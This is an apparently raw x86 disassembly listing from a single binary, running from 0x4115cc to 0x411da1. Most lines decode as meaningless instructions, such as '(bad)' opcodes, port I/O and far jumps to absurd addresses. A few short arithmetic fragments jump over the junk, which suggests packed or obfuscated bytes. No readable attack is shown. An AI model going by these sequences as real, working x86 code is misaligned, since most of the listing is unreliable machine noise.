  4115cc:	dec    edx
  4115cd:	jns    0x411567
  4115cf:	lock test eax,0x516bf4b3
  4115d5:	adc    DWORD PTR [ebx],0xffffffde
  4115d8:	call   0x9aa7a665
  4115dd:	call   0xd43a8152
  4115e2:	push   esi
  4115e3:	pop    ecx
  4115e4:	push   ecx
  4115e5:	sti    
  4115e6:	jmp    0x1af1:0xbabf95cf
  4115ed:	jns    0x4115eb
  4115ef:	push   ecx
  4115f0:	fnstcw WORD PTR [edx]
  4115f2:	cli    
  4115f3:	retf   0xb4ad
  4115f6:	fild   QWORD PTR [eax+0x2e73234a]
  4115fc:	mov    dh,0x99
  4115fe:	repz mov ch,BYTE PTR [ebp+0x66]
  411602:	sbb    eax,0x8e17bec6
  411607:	pop    ecx
  411608:	xlat   BYTE PTR ds:[ebx]
  411609:	pop    ss
  41160a:	test   BYTE PTR [edi-0x56f358c9],ch
  411610:	(bad)  
  411611:	aam    0x4c
  411613:	loopne 0x411637
  411615:	in     al,dx
  411616:	push   edi
  411617:	push   esi
  411618:	cli    
  411619:	outs   dx,BYTE PTR ds:[esi]
  41161a:	xor    DWORD PTR [ecx+esi*2+0x4e0e6036],edi
  411621:	in     al,dx
  411622:	aad    0xdd
  411624:	mov    DWORD PTR [esi],esi
  411626:	jne    0x411678
  411628:	xor    eax,0x457a3147
  41162d:	inc    ebp
  41162e:	adc    eax,0x96399bed
  411633:	pop    edi
  411634:	je     0x4115dd
  411636:	xchg   esi,eax
  411637:	and    bh,al
  411639:	ficomp DWORD PTR [ebp+0x6f]
  41163c:	jmp    0x4116a8
  41163e:	mov    WORD PTR [eax+0x7f2af85e],fs
  411644:	or     BYTE PTR [ebx+0xea2bbef],0x87
  41164b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41164c:	mov    dh,0x29
  41164e:	sbb    DWORD PTR [edx],ebp
  411650:	inc    esi
  411651:	adc    dl,0x7e
  411654:	and    al,0xe7
  411656:	xchg   ebp,edx
  411658:	inc    edi
  411659:	fcomp  QWORD PTR [ecx]
  41165b:	add    al,0xee
  41165d:	jmp    0x71b2:0x499ebeae
  411664:	xchg   eax,esp
  411666:	cmp    eax,0xf3ca5d1
  41166b:	ret    
  41166c:	mov    dh,0x54
  41166e:	sar    ebx,1
  411670:	xor    DWORD PTR [esi-0x61],esi
  411673:	push   edx
  411674:	inc    esi
  411675:	cld    
  411676:	mov    dl,0xaf
  411678:	and    al,0xf1
  41167a:	stos   BYTE PTR es:[edi],al
  41167b:	lods   al,BYTE PTR ds:[esi]
  41167c:	sub    esi,esp
  41167e:	inc    ecx
  41167f:	cmp    eax,esi
  411681:	outs   dx,DWORD PTR ds:[esi]
  411682:	in     al,dx
  411683:	sub    ah,dl
  411685:	pop    esp
  411686:	pop    ebx
  411687:	bndstx [ecx-0x77],bnd3
  41168b:	fiadd  WORD PTR [ebx-0xa]
  41168e:	mov    esi,0xc3bd39df
  411693:	sbb    al,BYTE PTR [ecx+0x43]
  411696:	ds dec ebp
  411698:	loopne 0x4116b1
  41169a:	mov    cl,0xe7
  41169c:	out    0xb6,al
  41169e:	mov    edx,0x1ea578c9
  4116a3:	xchg   DWORD PTR [esi],ecx
  4116a5:	inc    esi
  4116a6:	jae    0x4116c7
  4116a8:	inc    ebp
  4116a9:	std    
  4116aa:	jnp    0x411720
  4116ac:	ja     0x411708
  4116ae:	jecxz  0x41170c
  4116b0:	mov    ch,0x76
  4116b2:	ret    0x8690
  4116b5:	push   0xfffffff2
  4116b7:	jnp    0x41171b
  4116b9:	sub    eax,0x9c2bc77d
  4116be:	addr16 in eax,dx
  4116c0:	jns    0x411695
  4116c2:	mov    ds:0xfcf0b0dc,al
  4116c7:	aaa    
  4116c8:	or     al,0x54
  4116ca:	lods   eax,DWORD PTR ds:[esi]
  4116cb:	pop    ebp
  4116cc:	jne    0x41170b
  4116ce:	repnz not ch
  4116d1:	mov    eax,0x88bf6244
  4116d6:	fwait
  4116d7:	dec    ebp
  4116d8:	pavgw  mm4,QWORD PTR [edi]
  4116db:	xor    al,0xf7
  4116dd:	fist   WORD PTR [edx-0x42]
  4116e0:	lock fsubr QWORD PTR [ebp-0x22120486]
  4116e7:	mov    ds,eax
  4116e9:	in     al,dx
  4116ea:	sbb    DWORD PTR [ebx+0x51],edi
  4116ed:	xor    eax,0x50a2b14f
  4116f2:	sbb    esp,DWORD PTR [esi+eax*2+0x52]
  4116f6:	push   0xef953e56
  4116fb:	(bad)  
  4116fc:	leave  
  4116fd:	imul   ebp,DWORD PTR [edi-0x73925dc9],0x3e81aa97
  411707:	nop
  411708:	ret    0x8969
  41170b:	fistp  QWORD PTR [esi]
  41170d:	aas    
  41170e:	data16 jns 0x41169a
  411711:	cld    
  411712:	pop    es
  411713:	int3   
  411714:	xchg   BYTE PTR [edx+edx*4+0x76],bl
  411718:	pop    edi
  411719:	mov    eax,DWORD PTR [eax+ebx*2]
  41171c:	adc    ah,BYTE PTR [esi]
  41171e:	mov    cl,0xdf
  411720:	clc    
  411721:	outs   dx,BYTE PTR ds:[esi]
  411722:	sub    eax,DWORD PTR [esp+edi*1+0x54]
  411726:	add    edi,esp
  411728:	mov    esi,0xf714cda7
  41172d:	pop    eax
  41172e:	jecxz  0x411796
  411730:	xchg   ecx,eax
  411731:	ja     0x4116e3
  411733:	cmp    al,0x49
  411735:	or     eax,eax
  411737:	and    eax,0xd0cd8786
  41173c:	cld    
  41173d:	and    BYTE PTR ds:0xe98bc11,ah
  411743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411744:	repnz lods al,BYTE PTR ds:[esi]
  411746:	cmc    
  411747:	ret    
  411748:	ret    0x9527
  41174b:	jbe    0x41172f
  41174d:	sbb    DWORD PTR [edx],0xffffffdc
  411750:	push   0xffffffad
  411752:	push   ecx
  411753:	push   ebx
  411754:	fsubr  QWORD PTR [ebp+esi*4+0x13]
  411758:	(bad)  
  411759:	cmp    eax,0xee30e97e
  41175e:	pop    ebp
  41175f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411760:	add    eax,0x5defe1b2
  411765:	mov    ?,WORD PTR [edi-0x2a]
  411768:	sub    dh,BYTE PTR [edx+0x67253711]
  41176e:	xor    ebx,0xfffffff4
  411771:	fistp  QWORD PTR [edi]
  411773:	dec    eax
  411774:	cli    
  411775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411776:	(bad)
  411779:	inc    edi
  41177a:	mov    ds:0x8de3b4de,al
  41177f:	jle    0x411732
  411781:	push   ecx
  411782:	(bad)  
  411783:	bound  edi,QWORD PTR [eax]
  411785:	mov    DWORD PTR [ebx-0x17162fab],ecx
  41178b:	pop    es
  41178c:	add    BYTE PTR [eax],al
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	ror    al,cl
  4117b5:	dec    eax
  4117b6:	pop    ss
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	push   esp
  4117c0:	das    
  4117c1:	mov    al,0x24
  4117c3:	mov    ebp,0xbe78f3d0
  4117c8:	or     dl,BYTE PTR [eax+0x1c6fd23b]
  4117ce:	fsubr  QWORD PTR [edi+0x25bb46c7]
  4117d4:	pushf  
  4117d5:	(bad)  [ecx]
  4117d7:	mov    ebp,0xc162bea7
  4117dc:	pop    eax
  4117dd:	shr    ebp,0x48
  4117e0:	mov    ah,0x9
  4117e2:	cmp    dl,BYTE PTR [edi+eiz*8-0x15de578c]
  4117e9:	xchg   ebx,eax
  4117ea:	xlat   BYTE PTR ds:[ebx]
  4117eb:	sbb    edi,DWORD PTR [esi-0x73d46f49]
  4117f1:	gs pop ebp
  4117f3:	stos   BYTE PTR es:[edi],al
  4117f4:	jns    0x411793
  4117f6:	and    esp,eax
  4117f8:	shl    DWORD PTR [edi+0x70],cl
  4117fb:	fst    DWORD PTR [ecx+eiz*2]
  4117fe:	shl    DWORD PTR [edx],0x3d
  411801:	and    eax,0xf70893c2
  411806:	sub    cl,BYTE PTR [eax-0x73]
  411809:	xor    dh,dh
  41180b:	jl     0x41179a
  41180d:	fldenv [edi+ecx*8-0x7]
  411811:	or     eax,0x353fcfe4
  411816:	jmp    DWORD PTR [edx]
  411818:	and    dl,bl
  41181a:	jg     0x4117ee
  41181c:	adc    al,0xba
  41181e:	daa    
  41181f:	lahf   
  411820:	or     BYTE PTR [ebx+0x54],0xdc
  411824:	pop    ds
  411825:	pop    ebx
  411826:	sbb    al,0xe9
  411828:	loope  0x411896
  41182a:	push   edx
  41182b:	and    BYTE PTR [eax],al
  41182d:	icebp  
  41182e:	sub    edi,DWORD PTR [ebx+0x6008e6ff]
  411834:	jmp    0x9817820d
  411839:	xchg   ebp,eax
  41183a:	shl    BYTE PTR [ebp-0x38],cl
  41183d:	mov    ds:0xcdaf3b65,eax
  411842:	xchg   bh,bl
  411844:	ret    
  411845:	mov    al,0x4d
  411847:	inc    edi
  411848:	icebp  
  411849:	gs pop ecx
  41184b:	xor    al,0x71
  41184d:	inc    edx
  41184e:	fdivr  st,st(1)
  411850:	jae    0x41189d
  411852:	loop   0x41184e
  411854:	cmp    ebx,DWORD PTR [edx]
  411856:	enter  0xab16,0xe1
  41185a:	nop
  41185b:	jb     0x41188c
  41185d:	loopne 0x4118dd
  41185f:	jge    0x4118ca
  411861:	nop
  411862:	fld    st(7)
  411864:	cmc    
  411865:	aam    0x39
  411867:	(bad)  
  411868:	sub    DWORD PTR [edi-0x50],edi
  41186b:	xchg   edi,eax
  41186c:	ja     0x4118d5
  41186e:	or     eax,0x12d6d734
  411873:	mov    ebp,0x8b74dbcc
  411878:	sub    DWORD PTR [ecx+edx*2+0x65fe91e7],ebp
  41187f:	outs   dx,BYTE PTR ds:[esi]
  411880:	pop    ebp
  411881:	pop    edi
  411882:	fnstenv [edx]
  411884:	mov    cl,0x52
  411886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411887:	mov    ah,bl
  411889:	xchg   esi,eax
  41188a:	push   ecx
  41188b:	mov    esp,0xdb80c88e
  411890:	mov    edi,0x5929cb71
  411895:	popf   
  411896:	xchg   edx,eax
  411897:	ret    0xcb83
  41189a:	cmp    eax,0x48b82d3b
  41189f:	mov    ah,0xfc
  4118a1:	sub    DWORD PTR [esi],eax
  4118a3:	xor    al,0xa
  4118a5:	ret    0xdc68
  4118a8:	pop    edx
  4118a9:	add    al,0x83
  4118ab:	dec    esi
  4118ac:	xor    ch,cl
  4118ae:	aad    0x39
  4118b0:	lods   al,BYTE PTR ds:[esi]
  4118b1:	jmp    0x8d04:0x7d440ee4
  4118b8:	jge    0x411862
  4118ba:	pop    ds
  4118bb:	in     al,0xa2
  4118bd:	mov    al,0x78
  4118bf:	jge    0x4118b5
  4118c1:	sar    ecx,1
  4118c3:	test   al,0xd5
  4118c5:	rol    bl,1
  4118c7:	into   
  4118c8:	int3   
  4118c9:	mov    ch,0x3d
  4118cb:	mov    ebx,0x20989372
  4118d0:	inc    esp
  4118d1:	sbb    cl,BYTE PTR [ebp+0x6351ac44]
  4118d7:	inc    edx
  4118d8:	test   DWORD PTR [eax-0x19],ecx
  4118db:	jg     0x411929
  4118dd:	das    
  4118de:	mov    eax,DWORD PTR [ecx]
  4118e0:	les    eax,FWORD PTR [ebx+0x5a18b509]
  4118e6:	int3   
  4118e7:	gs out dx,al
  4118e9:	dec    edi
  4118ea:	pusha  
  4118eb:	jmp    0xade1:0xa21fa15f
  4118f2:	push   cs
  4118f3:	sbb    eax,DWORD PTR [ebp-0x2a]
  4118f6:	std    
  4118f7:	ficom  WORD PTR [edx-0x53]
  4118fa:	daa    
  4118fb:	mov    edi,0x6ff041fe
  411900:	push   edi
  411901:	jb     0x41196c
  411903:	gs dec ecx
  411905:	jg     0x4118cd
  411907:	icebp  
  411908:	iret   
  411909:	ret    0xd3fa
  41190c:	jo     0x4118e3
  41190e:	mov    eax,0x89115052
  411913:	js     0x41189d
  411915:	xchg   ebp,eax
  411916:	fwait
  411917:	retf   
  411918:	push   eax
  411919:	enter  0x843,0x1b
  41191d:	or     eax,0xf5da5e91
  411922:	xor    DWORD PTR [ebp-0x54],esi
  411925:	not    DWORD PTR [eax+0x4589d40b]
  41192b:	mov    ds:0x10ffcf15,al
  411930:	ds sub eax,0x7397a407
  411936:	fidiv  WORD PTR [esi-0x24]
  411939:	(bad)  
  41193a:	dec    ecx
  41193b:	sub    dl,BYTE PTR [eax-0x3d]
  41193e:	and    esi,DWORD PTR [ecx-0x5b]
  411941:	xor    DWORD PTR [edx+0x7209cbb5],edx
  411947:	rcl    ebp,cl
  411949:	pop    ebp
  41194a:	add    BYTE PTR [esi+0x23b31fc3],0x16
  411951:	xor    eax,0x54ddc24
  411956:	sub    ah,BYTE PTR [ecx+0x120b1887]
  41195c:	sub    al,0xa9
  41195e:	mov    esp,0x9b4a6893
  411963:	test   DWORD PTR [ecx-0x2e],ecx
  411966:	in     eax,0xed
  411968:	mov    al,ds:0x98801791
  41196d:	je     0x4119bd
  41196f:	cmp    DWORD PTR [edi-0x6e],ecx
  411972:	in     al,0xdc
  411974:	adc    edx,edx
  411976:	pop    ds
  411977:	mov    BYTE PTR ds:[ecx+0x56],0x2c
  41197c:	call   0x5b5549fe
  411981:	jmp    0x4119ad
  411983:	loope  0x411906
  411985:	sub    eax,0x13b2c475
  41198a:	outs   dx,DWORD PTR ds:[esi]
  41198b:	rol    DWORD PTR [ecx-0x130423e8],1
  411991:	sub    al,0xce
  411993:	cmp    BYTE PTR [ebx+0x7d],bh
  411996:	mov    eax,0x21e79af9
  41199b:	mov    edi,0x2bc4a781
  4119a0:	(bad)  
  4119a1:	stc    
  4119a2:	hlt    
  4119a3:	mov    ds,WORD PTR [ebp+0x6f6c6304]
  4119a9:	cmp    DWORD PTR [esi],edx
  4119ab:	ins    BYTE PTR es:[edi],dx
  4119ac:	pop    esp
  4119ad:	loop   0x411937
  4119af:	xor    eax,0x3f403d87
  4119b4:	test   eax,0xb34ffed
  4119b9:	imul   eax,DWORD PTR [ebx-0x2186df20],0xffffff9c
  4119c0:	jecxz  0x411a09
  4119c2:	inc    esi
  4119c3:	jmp    FWORD PTR [ecx+ecx*8-0x57]
  4119c7:	xchg   ecx,eax
  4119c8:	ss call 0x5a02fb6c
  4119ce:	xchg   esi,eax
  4119cf:	ins    DWORD PTR es:[edi],dx
  4119d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d1:	test   al,0x4e
  4119d3:	jns    0x4119ab
  4119d5:	shl    BYTE PTR fs:[edi+ebx*1],1
  4119d9:	inc    edx
  4119da:	sub    BYTE PTR [edx+0x5147f3c0],al
  4119e0:	and    eax,0x90741f5c
  4119e5:	mov    cl,0xbe
  4119e7:	push   esi
  4119e8:	cmp    BYTE PTR [edi+0x6d],0x6d
  4119ec:	sub    cl,BYTE PTR [ecx]
  4119ee:	or     BYTE PTR [eax],bl
  4119f0:	sub    eax,0xfe85d0d3
  4119f5:	mov    WORD PTR [ebx-0x28d9ac4c],gs
  4119fb:	inc    esi
  4119fc:	push   eax
  4119fd:	xchg   esi,eax
  4119fe:	xlat   BYTE PTR ds:[ebx]
  4119ff:	mov    esp,0x8b89a2e2
  411a04:	push   ecx
  411a05:	(bad)  
  411a07:	mov    bl,0x5
  411a09:	mov    ebx,0x12c5cc12
  411a0e:	int    0x24
  411a10:	mov    al,ds:0xa788921d
  411a15:	call   0xd523:0x9766935
  411a1c:	cdq    
  411a1d:	dec    ebp
  411a1e:	or     BYTE PTR [edi-0x25],ch
  411a21:	pop    eax
  411a22:	cdq    
  411a23:	or     al,0x83
  411a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a26:	pop    edi
  411a27:	or     eax,0x5d8b23c8
  411a2c:	lock sub ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x7cd7da8b
  411a62:	pusha  
  411a63:	fs pop ss
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	adc    BYTE PTR [ebx+ebp*1],0xee
  411a71:	pop    DWORD PTR [ecx-0x14dadf4f]
  411a77:	(bad)  
  411a79:	scas   eax,DWORD PTR es:[edi]
  411a7a:	stos   DWORD PTR es:[edi],eax
  411a7b:	add    bh,BYTE PTR [esi+ebp*8+0x15]
  411a7f:	int    0x5b
  411a81:	xlat   BYTE PTR ds:[ebx]
  411a82:	lock (bad) [ecx-0x321ae946]
  411a89:	jl     0x411aed
  411a8b:	or     al,0x78
  411a8d:	sbb    BYTE PTR [eax+0x20],ch
  411a90:	loope  0x411a24
  411a92:	test   DWORD PTR [esi+0xa],eax
  411a95:	stos   BYTE PTR es:[edi],al
  411a96:	sbb    eax,0x6d436a7f
  411a9b:	mov    cl,0xc8
  411a9d:	mov    BYTE PTR [ecx+ebp*8],0xc3
  411aa1:	pop    ss
  411aa2:	mov    al,ds:0xc7b10843
  411aa7:	add    eax,esi
  411aa9:	(bad)  
  411aaa:	stc    
  411aab:	pop    esi
  411aac:	push   ebp
  411aad:	push   es
  411aae:	cmp    ebx,DWORD PTR [edi]
  411ab0:	push   esi
  411ab1:	pop    ds
  411ab2:	(bad)  
  411ab3:	int    0x8b
  411ab5:	add    cl,0xab
  411ab8:	or     DWORD PTR es:[ebp+0x43d214c3],0xffffff9c
  411ac0:	lock mov edi,0x23dd4acc
  411ac6:	mov    ah,0x76
  411ac8:	mov    ds:0x3ecffca0,eax
  411acd:	adc    eax,0xee68d4c1
  411ad2:	pop    es
  411ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad4:	fs stos BYTE PTR es:[edi],al
  411ad6:	fiadd  WORD PTR [edx-0x734f9832]
  411adc:	add    ah,BYTE PTR [ecx]
  411ade:	cs mov ecx,0xc30c2c45
  411ae4:	mov    eax,0x6714f626
  411ae9:	shr    DWORD PTR [eax+0x18175721],1
  411aef:	jns    0x411b32
  411af1:	sub    ch,BYTE PTR [eax]
  411af3:	jae    0x411ad0
  411af5:	test   DWORD PTR [eax+edi*1-0x5c2492fc],edi
  411afc:	dec    edi
  411afd:	add    eax,0xb2e486a0
  411b02:	xchg   esp,eax
  411b03:	or     BYTE PTR [eax+0x3a],bh
  411b06:	ficomp WORD PTR [esi]
  411b08:	inc    ebp
  411b09:	hlt    
  411b0a:	mov    eax,0xfdd7a766
  411b0f:	pop    esi
  411b10:	fs pushf 
  411b12:	das    
  411b13:	neg    cl
  411b15:	xlat   BYTE PTR ds:[ebx]
  411b16:	xchg   ebx,eax
  411b17:	je     0x411b7b
  411b19:	xlat   BYTE PTR ds:[ebx]
  411b1a:	inc    ecx
  411b1b:	xchg   DWORD PTR [edi+0x3f],esi
  411b1e:	loop   0x411b84
  411b20:	add    al,0xc5
  411b22:	fwait
  411b23:	mov    dh,0xfc
  411b25:	or     eax,0x51c7a213
  411b2a:	ror    cl,1
  411b2c:	pop    ebp
  411b2d:	sub    ecx,DWORD PTR [edx]
  411b2f:	addr16 loop 0x411ac5
  411b32:	add    bh,BYTE PTR [esi-0x2195d3b1]
  411b38:	sub    edi,DWORD PTR [ebp-0x46]
  411b3b:	jle    0x411b3a
  411b3d:	mov    edi,0xf42b902f
  411b42:	arpl   WORD PTR [ebx],bx
  411b44:	inc    esi
  411b45:	cs sbb edi,0x2d
  411b49:	test   BYTE PTR [edx+0x65],0x7c
  411b4d:	call   0x8555b82c
  411b52:	adc    DWORD PTR [edx],ecx
  411b54:	adc    al,0x59
  411b56:	cdq    
  411b57:	pop    edx
  411b58:	cmp    ebx,DWORD PTR [ebp+0xd]
  411b5b:	mov    eax,ds:0xf78c300b
  411b60:	div    DWORD PTR [edx]
  411b62:	push   ds
  411b63:	vdivss xmm7,xmm3,xmm0
  411b67:	rcr    BYTE PTR [esi],0x85
  411b6a:	jo     0x411af4
  411b6c:	xchg   esi,eax
  411b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6e:	inc    edi
  411b6f:	pop    edx
  411b70:	cdq    
  411b71:	push   cs
  411b72:	lahf   
  411b73:	stos   BYTE PTR es:[edi],al
  411b74:	fld    TBYTE PTR [edx]
  411b76:	enter  0x447c,0xb0
  411b7a:	push   0xd34d8c6e
  411b7f:	into   
  411b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b81:	daa    
  411b82:	or     esp,esi
  411b84:	lds    edx,FWORD PTR [ebx]
  411b86:	push   edx
  411b87:	cld    
  411b88:	in     eax,dx
  411b89:	int    0x81
  411b8b:	shl    esi,1
  411b8d:	int    0x4f
  411b8f:	iret   
  411b90:	jmp    0x411bef
  411b92:	pop    ds
  411b93:	hlt    
  411b94:	test   ch,bh
  411b96:	xor    ebp,DWORD PTR ds:0x7ba465f7
  411b9c:	jmp    0xe062a7b6
  411ba1:	(bad)  [ebp-0x5c5dbd6e]
  411ba7:	rcl    BYTE PTR [ebp+0x67],1
  411baa:	xor    DWORD PTR fs:[edx+edi*2-0x5af7a2b7],ebx
  411bb2:	dec    eax
  411bb3:	sub    cl,BYTE PTR [esi-0x70]
  411bb6:	or     ah,BYTE PTR [ebp+0x6707b854]
  411bbc:	add    BYTE PTR [edx-0x40],bl
  411bbf:	sub    al,BYTE PTR [esi]
  411bc1:	(bad)  
  411bc2:	jmp    0x9d15e67b
  411bc7:	mov    dh,0x67
  411bc9:	and    DWORD PTR [edi+0x67e83593],ecx
  411bcf:	sub    al,0x32
  411bd2:	sbb    BYTE PTR [ecx],ch
  411bd4:	(bad)  
  411bd6:	and    eax,0x5a84faf2
  411bdb:	xor    edi,DWORD PTR [esi-0x7c4f4766]
  411be1:	cmp    ebp,DWORD PTR ds:0xf1a76c8b
  411be7:	repnz ins BYTE PTR es:[edi],dx
  411be9:	aaa    
  411bea:	out    dx,eax
  411beb:	pop    ebx
  411bec:	mov    ds:0x20507e77,eax
  411bf1:	dec    esi
  411bf2:	jae    0x411c1b
  411bf4:	add    eax,0x533d8562
  411bf9:	ror    DWORD PTR [edi-0x50dc5927],1
  411bff:	addr16 out 0x8,eax
  411c02:	push   ebp
  411c03:	push   cs
  411c04:	or     eax,0xb374969c
  411c09:	cld    
  411c0a:	(bad)  
  411c0b:	repnz xchg edx,eax
  411c0d:	sbb    BYTE PTR [edx],ah
  411c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c10:	gs push es
  411c12:	bound  edi,QWORD PTR [ebp+0xb]
  411c15:	outs   dx,BYTE PTR ds:[esi]
  411c16:	sbb    BYTE PTR [esi+0x2d],ah
  411c19:	pop    edx
  411c1a:	jno    0x411c12
  411c1c:	jbe    0x411bd5
  411c1e:	push   eax
  411c1f:	inc    ebx
  411c20:	adc    eax,0xfc097577
  411c25:	iret   
  411c26:	mov    ds:0xcf8ebc93,eax
  411c2b:	sub    BYTE PTR [edi-0x6a9db027],dl
  411c31:	xchg   edi,eax
  411c32:	aas    
  411c33:	fisubr WORD PTR [edx]
  411c35:	push   edx
  411c36:	shl    BYTE PTR [edi+ecx*2],cl
  411c39:	mov    eax,0x9278fa01
  411c3e:	fsub   DWORD PTR [edx-0x5d]
  411c41:	sbb    BYTE PTR [edi+0x37],0x9d
  411c45:	and    bl,BYTE PTR [edi+0x3e]
  411c48:	outs   dx,BYTE PTR ds:[esi]
  411c49:	test   DWORD PTR [esi+0x2a46ef2f],ebx
  411c4f:	pop    ss
  411c50:	mov    ebp,0xfc3216e9
  411c55:	(bad)  
  411c56:	dec    eax
  411c57:	sub    DWORD PTR [edx+ebp*4-0x12],0x46ba0152
  411c5f:	and    dl,BYTE PTR [ecx+0x1ebaf1d]
  411c65:	out    dx,al
  411c66:	inc    edi
  411c67:	mov    eax,0x6329663c
  411c6c:	xchg   ebx,eax
  411c6d:	and    DWORD PTR [esi],eax
  411c6f:	popa   
  411c70:	neg    BYTE PTR [edx]
  411c72:	inc    eax
  411c73:	push   ss
  411c74:	and    al,0x40
  411c76:	mov    al,BYTE PTR [eax-0x833954e]
  411c7c:	xchg   esi,eax
  411c7d:	xor    BYTE PTR [eax+0x52],bl
  411c80:	xchg   ebp,eax
  411c81:	das    
  411c82:	stos   BYTE PTR es:[edi],al
  411c83:	add    esp,edi
  411c85:	popa   
  411c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c87:	or     eax,0x358a45ec
  411c8c:	gs int 0xbf
  411c8f:	(bad)  
  411c90:	js     0x411c66
  411c92:	sar    DWORD PTR [eax-0x1b],cl
  411c95:	and    edx,DWORD PTR [ebp-0x4ce95611]
  411c9b:	jbe    0x411d14
  411c9d:	mov    edx,0x6bf1685e
  411ca2:	icebp  
  411ca3:	lahf   
  411ca4:	sub    bl,BYTE PTR [eax]
  411ca6:	pop    ebp
  411ca7:	jge    0x411c68
  411ca9:	xor    ecx,esi
  411cab:	xor    al,0x21
  411cad:	bound  esi,QWORD PTR [ecx+0x1812f90b]
  411cb3:	out    dx,eax
  411cb4:	mov    ebx,0x8698bc27
  411cb9:	jbe    0x411c3e
  411cbb:	mov    cl,0x47
  411cbd:	adc    ah,ch
  411cbf:	(bad)  
  411cc0:	jl     0x411c99
  411cc2:	jbe    0x411cac
  411cc4:	add    DWORD PTR [eax],edx
  411cc6:	adc    DWORD PTR [ebp-0x5f],0x2d
  411cca:	out    dx,al
  411ccb:	adc    BYTE PTR [edi],ah
  411ccd:	dec    edi
  411cce:	dec    ebx
  411ccf:	jmp    0xc97396db
  411cd4:	sub    edx,ebx
  411cd6:	fiadd  WORD PTR ds:0x8bf87d8b
  411cdc:	pop    ebp
  411cdd:	lock sub ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x9666579e
  411cfd:	sbb    edx,DWORD PTR [ecx]
  411cff:	sub    DWORD PTR [esi+0x65],edi
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	sbb    cl,BYTE PTR [ecx-0x6fd614f5]
  411d0e:	mov    cl,0x1e
  411d10:	hlt    
  411d11:	add    DWORD PTR [esi+0x40547180],esi
  411d17:	leave  
  411d18:	mov    dh,BYTE PTR [ecx+edx*2]
  411d1b:	je     0x411caa
  411d1d:	push   es
  411d1e:	rol    BYTE PTR ds:0x8e53bf45,1
  411d24:	inc    ecx
  411d25:	cmp    al,BYTE PTR [ebx]
  411d27:	push   esp
  411d28:	mov    ebx,0x5d60d00d
  411d2d:	and    al,0x15
  411d2f:	lds    eax,FWORD PTR [esi+0x2f6c9374]
  411d35:	cs scas eax,DWORD PTR es:[edi]
  411d37:	cli    
  411d38:	int3   
  411d39:	inc    esp
  411d3a:	inc    eax
  411d3b:	jl     0x411d2b
  411d3d:	popa   
  411d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d3f:	ins    DWORD PTR es:[edi],dx
  411d40:	ins    BYTE PTR es:[edi],dx
  411d41:	and    DWORD PTR [eax],ebx
  411d43:	cs mov dl,0x4b
  411d46:	stos   BYTE PTR es:[edi],al
  411d47:	mov    ecx,0x64e6a31e
  411d4c:	push   edx
  411d4d:	inc    ecx
  411d4e:	pushf  
  411d4f:	call   0xed36c334
  411d54:	mov    DWORD PTR [ebp-0x1f7cad36],esi
  411d5a:	int3   
  411d5b:	repz mov ds:0x9faf97c7,al
  411d61:	inc    ebx
  411d62:	add    DWORD PTR [ebx+0x40],edx
  411d65:	pushf  
  411d66:	mov    bh,0xde
  411d68:	push   eax
  411d69:	ficomp WORD PTR [esi-0x42]
  411d6c:	inc    BYTE PTR [ecx]
  411d6e:	(bad)  
  411d6f:	lahf   
  411d70:	inc    ecx
  411d71:	adc    bl,BYTE PTR [ebp+0x610b36df]
  411d77:	mov    ?,edi
  411d79:	jns    0x411d5d
  411d7b:	xchg   edi,eax
  411d7c:	adc    DWORD PTR [ebx+eiz*4-0x4],0x67cafa63
  411d84:	xor    edx,DWORD PTR [esi-0x25871a9c]
  411d8a:	ror    ebx,1
  411d8c:	sub    DWORD PTR [eax-0x204527c1],0xffffffa3
  411d93:	cmp    al,0x23
  411d95:	jno    0x411dff
  411d97:	and    dh,cl
  411d99:	dec    eax
  411d9a:	mov    ch,0x44
  411d9c:	daa    
  411d9d:	aad    0x81
  411d9f:	bound  ecx,QWORD PTR [edx]
  411da1:	outs   dx,BYTE PTR ds:[esi]
